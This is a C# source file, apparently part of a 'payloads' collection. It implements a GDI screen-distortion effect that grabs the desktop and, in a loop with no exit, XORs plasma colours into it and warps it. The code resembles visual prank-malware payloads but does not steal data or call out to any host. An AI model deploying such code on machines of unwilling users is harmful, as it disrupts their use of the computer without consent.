using System.Runtime.InteropServices;

namespace Caesium.Payloads;

public abstract unsafe partial class RawLiquidEngine : IPayload
{
    [StructLayout(LayoutKind.Sequential)]
    public struct Bitmapinfo
    {
        public uint biSize;
        public int biWidth;
        public int biHeight;
        public ushort biPlanes;
        public ushort biBitCount;
        public uint biCompression;
        public uint biSizeImage;
        public int biXPelsPerMeter;
        public int biYPelsPerMeter;
        public uint biClrUsed;
        public uint biClrImportant;
    }
    
    private enum TernaryRasterOperations : uint
    {
        /// <summary>dest = source</summary>
        SrcCopy = 0x00CC0020,
        /// <summary>dest = source OR dest</summary>
        SrcPaint = 0x00EE0086,
        /// <summary>dest = source AND dest</summary>
        SrcAnd = 0x008800C6,
        /// <summary>dest = source XOR dest</summary>
        SrcInvert = 0x00660046,
        /// <summary>dest = source AND (NOT dest)</summary>
        SrcErase = 0x00440328,
        /// <summary>dest = NOT source</summary>
        NotSrcCopy = 0x00330008,
        /// <summary>dest = NOT (source OR dest)</summary>
        NotSrcErase = 0x001100A6,
        /// <summary>dest = (source AND pattern) XOR dest</summary>
        MergeCopy = 0x00C000CA,
        /// <summary>dest = (NOT source) AND (NOT pattern)</summary>
        MergePaint = 0x00BB0226,
        /// <summary>dest = pattern</summary>
        PatCopy = 0x00F00021,
        /// <summary>dest = pattern XOR dest</summary>
        PatInvert = 0x005A0049,
        /// <summary>dest = (NOT source) OR pattern</summary>
        PatPaint = 0x00FB0A09,
        /// <summary>dest = source XOR (source AND dest)</summary>
        Whiteness = 0x00FF0062,
        /// <summary>dest = 0 (Black)</summary>
        Blackness = 0x00000042,
        /// <summary>dest = NOT dest</summary>
        DstInvert = 0x00550009
    }
    
    private static readonly TernaryRasterOperations[] ChaoticRops = 
    [
        TernaryRasterOperations.SrcCopy,   // Standard melt
        TernaryRasterOperations.SrcInvert, // XOR (Hallucinatory)
        TernaryRasterOperations.SrcPaint,  // Additive (Glowing)
        TernaryRasterOperations.SrcAnd,    // Subtractive (Crusty)
        TernaryRasterOperations.SrcErase,  // Selective erase
        TernaryRasterOperations.NotSrcCopy // Total inversion
    ];

    [LibraryImport("gdi32.dll")]
    private static partial IntPtr CreateDIBSection(IntPtr hdc, in Bitmapinfo pbmi, uint iUsage, out void* ppvBits,
        IntPtr hSection, uint dwOffset);

    // --- WIN32 IMPORTS ---
    [LibraryImport("user32.dll")]
    private static partial IntPtr GetDC(IntPtr hwnd);

    [LibraryImport("user32.dll")]
    private static partial int GetSystemMetrics(int nIndex);

    [LibraryImport("gdi32.dll")]
    private static partial IntPtr CreateCompatibleDC(IntPtr hdc);

    [LibraryImport("gdi32.dll")]
    private static partial void SelectObject(IntPtr hdc, IntPtr h);

    [LibraryImport("gdi32.dll")]
    private static partial void BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xS, int yS, TernaryRasterOperations rop);

    [LibraryImport("gdi32.dll")]
    private static partial void PlgBlt(IntPtr hdcD, JitterMouse.Point[] lpPoint, IntPtr hdcS, int xS, int yS, int w,
        int h, IntPtr hbm, int xM, int yM);


    public static void Execute()
    {
        var w = GetSystemMetrics(0);
        var h = GetSystemMetrics(1);
        var hdc = GetDC(IntPtr.Zero);

        var bmi = new Bitmapinfo
        {
            biSize = (uint)sizeof(Bitmapinfo),
            biWidth = w,
            biHeight = -h,
            biPlanes = 1,
            biBitCount = 32
        };

        var hdcMem = CreateCompatibleDC(hdc);
        var hBitmap = CreateDIBSection(hdc, in bmi, 0, out var pBits, IntPtr.Zero, 0);
        SelectObject(hdcMem, hBitmap);
        var pixelPtr = (int*)pBits;

        var t = 0.0f;
        var frameCount = 0;
        const int gridSize = 30;
        var pts = new JitterMouse.Point[3];
        var currentRop = TernaryRasterOperations.SrcCopy;
        
        while (true)
        {
            frameCount++;
            t += 0.05f;
            if (frameCount % 200 == 0)
            {
                currentRop = ChaoticRops[Random.Shared.Next(ChaoticRops.Length)];
            }
            
            var jitterX = (int)(MathF.Sin(t) * 2); 
            var jitterY = (int)(MathF.Cos(t) * 2);
            BitBlt(hdcMem, 0, 0, w, h, hdc, jitterX, jitterY, currentRop);

            // OPTIMIZATION: Process pixels in a single pass
            // We only process every 4th pixel to keep CPU usage sane
            for (var py = 0; py < h; py += 4)
            {
                var row = py * w;
                for (var px = 0; px < w; px += 4)
                {
                    var uvX = (float)px / w;
                    var uvY = (float)py / h;

                    // Simplified Plasma Math
                    var v = MathF.Sin(uvX * 8.0f + t) + MathF.Sin(uvY * 8.0f + t);

                    var r = (int)((MathF.Sin(v + t) + 1f) * 60);
                    var g = (int)((MathF.Sin(v + t + 2f) + 1f) * 60);
                    var b = (int)((MathF.Sin(v + t + 4f) + 1f) * 60);

                    // XOR directly into the pixel buffer
                    pixelPtr[row + px] ^= ((r << 16) | (g << 8) | b) & 0x3F3F3F;
                }
            }

            // WARP PASS
            for (var gy = 0; gy < h; gy += gridSize)
            for (var gx = 0; gx < w; gx += gridSize)
            {
                var v = MathF.Sin((float)gx / w * 10f + t) + MathF.Sin((float)gy / h * 10f + t);
                var ox = (int)(MathF.Sin(v) * 12);
                var oy = (int)(MathF.Cos(v) * 12);

                pts[0].X = gx + ox;            pts[0].Y = gy + oy;
                pts[1].X = gx + gridSize + ox; pts[1].Y = gy + oy;
                pts[2].X = gx + ox;            pts[2].Y = gy + gridSize + oy;

                PlgBlt(hdc, pts, hdcMem, gx, gy, gridSize, gridSize, IntPtr.Zero, 0, 0);
            }

            // No sleep or very low sleep for maximum "Fluidity"
            Thread.Sleep(5);
        }
    }
}